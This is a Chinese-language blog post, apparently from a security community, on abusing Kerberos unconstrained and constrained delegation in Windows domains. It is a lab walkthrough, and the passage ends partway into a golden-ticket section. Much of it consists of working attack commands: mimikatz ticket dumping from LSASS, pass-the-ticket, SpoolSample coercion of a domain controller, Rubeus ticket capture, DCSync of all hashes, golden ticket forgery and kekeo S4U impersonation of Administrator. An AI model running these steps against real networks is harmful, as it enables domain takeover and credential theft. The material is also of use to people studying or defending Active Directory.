<h2 id="非约束委派的利用"><a href="#非约束委派的利用" class="headerlink" title="非约束委派的利用"></a>非约束委派的利用</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p>
<p>非约束委派的请求过程（图来自微软手册）：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200206130430-2805d11a-489e-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>上图的Kerberos请求描述分为如下步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。</span><br><span class="line"></span><br><span class="line">2. KDC在`KRB_AS_REP`消息中返回`TGT1`。</span><br><span class="line"></span><br><span class="line">3. 用户根据步骤2中的TGT1请求转发TGT2。</span><br><span class="line"></span><br><span class="line">4. KDC在KRB_TGS_REP消息中为user返回TGT2。</span><br><span class="line"></span><br><span class="line">5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）</span><br><span class="line"></span><br><span class="line">6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。</span><br><span class="line"></span><br><span class="line">7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey</span><br><span class="line"></span><br><span class="line">8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。</span><br><span class="line"></span><br><span class="line">9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。</span><br><span class="line"></span><br><span class="line">10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。</span><br><span class="line"></span><br><span class="line">11. service2响应service1的请求。</span><br><span class="line"></span><br><span class="line">12. 有了这个响应，service1就可以在步骤7中响应用户的请求。</span><br><span class="line"></span><br><span class="line">13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。</span><br><span class="line"></span><br><span class="line">14. KDC返回步骤13中请求的ST</span><br><span class="line"></span><br><span class="line">15-16. service1以用户的名义来请求其它服务</span><br></pre></td></tr></table></figure>
<p><strong>注</strong>：<code>TGT1（forwardable TGT）</code>用于访问<code>Service1</code>，<code>TGT2（forwarded TGT）</code>用于访问<code>Service2</code></p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p>
<ul>
<li>域：<code>qiyou.com</code></li>
<li>域控：windows server 2008R2，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li>
<li>域内主机：windows server 2008R2，主机名：<code>DM2008</code>，IP：<code>192.168.141.183</code>，用户：<code>qiyou</code></li>
</ul>
<p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p>
<p>现在我们将<code>DM2008</code>这个主机用户设置为非约束委派（注意是：主机用户而不是服务用户，多谢先知评论区的<code>3t2ugg1e</code>师傅指正）</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200229223822-22b87436-5b01-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>然后我们以<code>administrator</code>的身份通过<code>WinRM</code>服务远程连接<code>DM2008</code></p>
<p><strong>注</strong>：常见的连接方式还有：MSSQL和IIS，不过我们这里为了方便演示就直接用WinRM了</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211111033-1160a96c-4c7c-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>这个时候域管理员的TGT已经缓存在<code>DM2008</code>了，我们用mimikatz即可dump出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211110803-b7eafc16-4c7b-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>可以看到<code>[0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</code>即为域管理<code>administrator</code>的TGT</p>
<p>此时我们访问域控是被拒绝的</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211112007-67121a34-4c7d-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>然后通过ptt将TGT注入到当前会话中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
<p>成功访问</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211111640-eb9fe46c-4c7c-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p><strong>注意</strong>：访问域控要用主机名或者是<code>FQDN</code>，使用IP还是会提示<code>拒绝访问</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211112457-14599c12-4c7e-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>如果想执行命令的话，我们可以用<code>WinRM</code>服务来远程连接域控服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName WIN-QFPHJSM1L7G</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-ComputerName</code>指定主机名</li>
<li>如果你WinRM服务端口改了的话，可以用<code>-Port</code>指定<code>WinRM</code>端口，默认是<code>5985</code></li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211112640-514590cc-4c7e-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p><strong>注</strong>：<code>Windows Server 2012</code>及以上默认是开启WinRM服务的，<code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的。</p>
<h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p>
<p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是<code>tifkin_</code>，<code>enigma0x3</code>和<code>harmj0y</code>在<code>DerbyCon 2018</code>提出的</p>
<p>演讲PPT：<a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory" target="_blank" rel="noopener">地址</a></p>
<p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p>
<p>请求过程如下：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210232526-900988fa-4c19-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<blockquote>
<p>图来源于：<a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p>
</blockquote>
<p><strong>注</strong>：<code>Print Spooler</code>服务默认是自动运行的</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211000739-75ec4826-4c1f-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p><strong>注</strong>：我在<code>windows server 2008</code>上操作没有成功，不知道是我的问题还是有版本限制，按照上面的原理来说应该是没有版本限制的，不过把域环境重新配置了一遍，域控换成了<code>windows server 2012R2</code>就成功了</p>
<p>操作环境：</p>
<ul>
<li>域：<code>test.local</code></li>
<li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code></li>
<li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code></li>
</ul>
<p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p>
<p>我们给win10这个主机账户开启非约束委派</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210231239-c749c250-4c17-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p>
<p><code>tifkin_</code>在他的github上开源了POC：<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">https://github.com/leechristensen/SpoolSample</a></p>
<p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe dm2012 win10</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211001236-272ec7d0-4c20-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>我们可以用<code>Rubeus</code>来监听<code>Event ID</code>为<code>4624</code>事件，这样可以第一时间截取到域控的TGT</p>
<p>每隔一秒监听一次来自<code>dm2012</code>的登陆（需要本地管理员权限）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:dm2012$</span><br></pre></td></tr></table></figure>
<p><strong>注</strong>：Rubeus.exe捕获到的TGT是base64编码的，但是我们不需要解码，<code>Rubeus</code>可以直接将base64编码的票据直接注入到内存中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:base64</span><br></pre></td></tr></table></figure>
<p>因为之前域内主机win10的安全日志被我搞崩了，所以这里就不演示了</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210222255-d446d31e-4c10-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>因为我们Rubeus监听TGT用不了，所以我们可以用<code>mimikatz</code>导出TGT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
<p>可以发现成功导出来自<code>DM2012$</code>的TGT</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200210220650-94f45f80-4c0e-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211002536-f7dcc0c0-4c21-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:test.local /all /csv</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211002107-57633dd6-4c21-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</span><br></pre></td></tr></table></figure>
<p>成功以administrator的身份访问域控</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211004433-9d945bd4-4c24-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>执行命令可以用<code>WinRM</code>服务来远程连接域控</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211004601-d257f3e4-4c24-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>关于<code>Spooler</code>服务的利用还有<code>CVE-2019-1040</code>，不过这个是基于资源的约束委派，有兴趣的同学可以去了解一下</p>
<h2 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p>
<p><code>S4U2Self</code>和<code>S4U2proxy</code>的请求过程（图来自微软手册）：</p>
<p><strong>注</strong>：其中步骤1-4代表<code>S4U2Self</code>请求的过程，步骤5-10代表<code>S4U2proxy</code>的请求过程</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200207103902-002e844c-4953-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>上述请求的文字描述：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。</span><br><span class="line"></span><br><span class="line">2. 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。</span><br><span class="line"></span><br><span class="line">3. KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据。</span><br><span class="line"></span><br><span class="line">4. service1可以使用ST中的授权数据来满足用户的请求，然后响应用户。</span><br><span class="line">注：尽管S4U2self向service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了</span><br><span class="line"></span><br><span class="line">5. 用户向service1发出请求，service1需要以用户身份访问service2上的资源。</span><br><span class="line"></span><br><span class="line">6. service1以用户的名义向KDC请求用户访问service2的ST2</span><br><span class="line"></span><br><span class="line">7. 如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC ，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。</span><br><span class="line"></span><br><span class="line">8. service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证。</span><br><span class="line"></span><br><span class="line">9. service2响应步骤8的请求。</span><br><span class="line"></span><br><span class="line">10. service1响应用户对步骤5中的请求。</span><br></pre></td></tr></table></figure>
<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p>
<ul>
<li>域：<code>qiyou.com</code></li>
<li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li>
<li>域内主机：<code>DM08</code></li>
</ul>
<p><code>DM08</code>是域内的另外一台主机，下面我们设置了服务用户<code>qiyou</code>对<code>DM08</code>的<code>cifs</code>服务的委派</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208162356-59615fcc-4a4c-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>概述那里我们讲了在约束委派的情况下，服务用户只能获取某个用户（或主机）的服务的ST，所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者<code>NTLM Hash</code>，我们就可以伪造S4U请求，进而伪装成服务用户以<strong>任意账户</strong>的权限申请访问某服务的ST</p>
<p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<p><code>/user</code>: 服务用户的用户名</p>
<p><code>/password</code>: 服务用户的明文密码</p>
<p><code>/domain</code>: 所在域名</p>
<p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208132812-cce6165e-4a33-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>得到服务用户TGT：<a href="mailto:`TGT_qiyou@QIYOU.CO" target="_blank" rel="noopener">`TGT_qiyou@QIYOU.CO</a><a href="mailto:M_krbtgt~qiyou.com@QIYOU.COM.kirbi" target="_blank" rel="noopener">M_krbtgt~qiyou.com@QIYOU.COM.kirbi</a>`</p>
<p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>dm08 CIFS</code>的ST</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208133328-88ef2eb2-4a34-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的dm08 CIFS服务的ST2会保存在当前目录下</p>
<p>然后我们用mimikatz将ST2导入当前会话即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
<p>成功访问到dm08的cifs服务</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208135043-f1a80198-4a36-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>上面是知道服务用户明文的情况下，kekeo同样也支持使用<code>NTLM Hash</code></p>
<p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p>
<p>已知我们服务账号<code>qiyou</code>的<code>NTLM hash</code>是<code>b4f27a13d0f78d5ad83750095ef2d8ec</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208165346-847a63c6-4a50-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208165529-c1e160f2-4a50-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208171625-ae0701f6-4a53-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p>
<p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;196b1e4]-2-0-60a00000-qiyou@krbtgt-QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208172530-f34096f0-4a54-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208172423-cae97370-4a54-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>我们来抓包看一下整个委派请求的过程</p>
<p>可以看到有6个请求响应的过程，我们可以分为3步来分析</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211165154-c0c23590-4cab-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<ol>
<li>可以看到用户<code>qiyou</code>首先向KDC请求一张TGT，<code>AS-REP</code>请求里返回TGT，这张TGT代表的是qiyou这个用户</li>
</ol>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211165502-30b415da-4cac-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>2 然后用这张<code>TGT</code>发送<code>S4U2self</code>请求，以<code>Administrator</code>的名义向<code>TGS</code>申请了一张访问自身服务的票据，我们这里就称为ST1吧</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211165823-a87b2da6-4cac-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<ol start="3">
<li>得到<code>ST1</code>之后，然后会带上ST1再次向<code>KDC</code>发起<code>SU42Proxy</code>请求，以<code>administrator</code>的名义请求一张访问<code>DM08 cifs</code>服务的票据，我们这里就称为<code>ST2</code>吧</li>
</ol>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211170205-2cc5d624-4cad-1.png" alt="image.png" title>
                </div>
                <div class="image-caption">image.png</div>
            </figure>
<p>上述数据包请求过程中：第一步对应的是我们kekeo的<code>tgt::ask</code>；2-3是对应<code>tgs::s4u</code>，其中ST1和ST2分别对应的就是kekeo生成的<a href="mailto:`TGS_Administrator@qiyou.com" target="_blank" rel="noopener">`TGS_Administrator@qiyou.com</a>@<a href="mailto:QIYOU.COM_qiyou@QIYOU.COM.kirbi" target="_blank" rel="noopener">QIYOU.COM_qiyou@QIYOU.COM.kirbi</a><code>和</code><a href="mailto:TGS_Administrator@qiyou.com" target="_blank" rel="noopener">TGS_Administrator@qiyou.com</a>@<a href="mailto:QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi" target="_blank" rel="noopener">QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</a>`，不过我们最终用到是ST2，ST1可以看作一个中间产物。</p>
<p>得到ST2之后我们就可以回到我们的攻击机上进行ptt就能得到<code>DM08 cifs</code>的访问权限了</p>
<h3 id="利用约束委派生成黄金票据"><a href="#利用约束委派生成黄金票据" class="headerlink" title="利用约束委派生成黄金票据"></a>利用约束委派生成黄金票据</h3><p>操作环境：</p>
<ul>
<li>域：<code>qiyou.com</code></li>
<li>域控：<code>windows server 2008R2</code>，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li>
<li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li>
</ul>
<p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p>
<p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p>
<p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p>
